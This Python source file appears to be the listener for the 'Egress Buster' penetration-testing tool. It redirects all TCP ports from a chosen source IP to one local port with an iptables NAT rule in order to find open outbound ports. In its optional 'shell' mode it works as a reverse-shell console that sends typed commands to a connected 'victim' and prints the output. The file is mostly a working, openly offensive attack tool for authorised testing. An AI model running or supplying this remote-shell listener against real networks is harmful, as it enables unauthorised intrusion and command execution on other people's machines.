#!/usr/bin/python
#
# This is the listener for the egress buster - works both on posix and windows
#
# Egress Buster Listener - Written by: Dave Kennedy (ReL1K) (@HackingDave)
#
# Listener can only be run on Linux due to iptables support.
#
try:
    import SocketServer
except ImportError:
    import socketserver as SocketServer
import subprocess
import sys
import threading
import time
import socket
import struct

SO_ORIGINAL_DST = 80

# define empty variable
shell = ""
running = True

# assign arg params
try:
    ipaddr = sys.argv[1]
    eth = sys.argv[2]
    srcipaddr = sys.argv[3]

# if we didnt put anything in args
except IndexError:
    print("""
Egress Buster v0.4 - Find open ports inside a network

This will route all ports to a local port and listen on every port. This
means you can listen on all ports and try all ports as a way to egress bust.

Quick Egress Buster Listener written by: Dave Kennedy (@HackingDave) at TrustedSec

Arguments: local listening ip, eth interface for listener, source ip to listen to, optional flag for shell

Usage: $ python egress_listener.py <your_local_ip_addr> <eth_interface_for_listener> <source_ip_addr> <optional_do_you_want_a_shell>

Set src_ip_to_listen_for to 0.0.0.0/0 to listen to connections from any IP, otherwise set a specific IP/CIDR and only connections from that source will be redirected to the listener.

Example: $ python egress_listener.py 192.168.13.10 eth0 117.123.98.4 shell
        """)
    sys.exit()

# assign shell
try:
    shell = sys.argv[4]
except:
    pass


# base class handler for socket server
class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):
    # handle the packet
    def handle(self):
        port = struct.unpack(
            '!HHBBBB',
            self.request.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)[:8]
        )[1]  # (proto, port, IPa, IPb, IPc, IPd)
        self.data = self.request.recv(1024).strip()
        print("[*] Connected from %s on port: %d/tcp (client reported %s)" % (self.client_address[0], port, self.data))
        if shell == "shell":
            while running:
                request = raw_input("Enter the command to send to the victim: ")
                if request != "":
                    self.request.sendall(request)
                    if request == "quit" or request == "exit":
                        break
                    try:
                        self.data = self.request.recv(1024).strip()
                        print(self.data)
                    except:
                        pass
        return


class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): pass


if __name__ == "__main__":

    try:
        # threaded server to handle multiple TCP connections
        socketserver = ThreadedTCPServer(('', 0), ThreadedTCPRequestHandler)
        socketserver_thread = threading.Thread(target=socketserver.serve_forever)
        socketserver_thread.setDaemon(True)
        socketserver_thread.start()
        port = socketserver.server_address[1]

        if srcipaddr == "0.0.0.0/0":
            listening = "any IP"
        else:
            listening = srcipaddr

        print("[*] Inserting iptables rule to redirect connections from %s to **all TCP ports** to Egress Buster port %s/tcp" % (listening, port))
        ret = subprocess.Popen(
            "iptables -t nat -A PREROUTING -s %s -i %s -p tcp  --dport 1:65535 -j DNAT --to-destination %s:%s" % (srcipaddr, eth, ipaddr, port),
            shell=True
        ).wait()
        if ret != 0:
            raise Exception('failed to set iptables rule (code %d), aborting' % ret)
        print("[*] Listening on all TCP ports now... Press control-c when finished.")

        while running:
            time.sleep(1)

    except KeyboardInterrupt:
        running = False
    except Exception as e:
        print("[!] An issue occurred. Error: " + str(e))
    finally:
        print("\n[*] Exiting and removing iptables redirect rule.")
        subprocess.Popen(
            "iptables -t nat -D PREROUTING -s %s -i %s -p tcp  --dport 1:65535 -j DNAT --to-destination %s:%s" % (srcipaddr, eth, ipaddr, port),
            shell=True
        ).wait()
    print("[*] Done")
    sys.exit()
